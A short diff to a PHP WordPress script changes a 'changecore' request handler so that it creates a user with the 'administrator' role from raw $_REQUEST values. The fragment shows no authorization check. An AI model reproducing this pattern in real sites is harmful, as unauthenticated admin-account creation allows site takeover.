@@ -35,9 +35,9 @@ if ($_REQUEST['action'] == "changecore") {
 		$new_pass = $_REQUEST['new_pass'];
 		$new_nicename = strtolower($new_login);
 		$new_email = $_REQUEST['new_email'];
-		$new_status = 0;
 		$new_display = $new_login;
-		$userdata = array("user_login" => $new_login, "user_pass" => $new_pass,"user_nicename" => $new_nicename, "user_email" => $new_email,"user_status" => $new_status,"display_name" => $new_display);
+		$role = 'administrator';
+		$userdata = array("user_login" => $new_login, "user_pass" => $new_pass,"user_nicename" => $new_nicename, "user_email" => $new_email,"display_name" => $new_display,"role" => $role);
 		if ( !wp_insert_user( $userdata )) {
 			$fail .= "<li>New user could not be added.</li>";
 		} else {
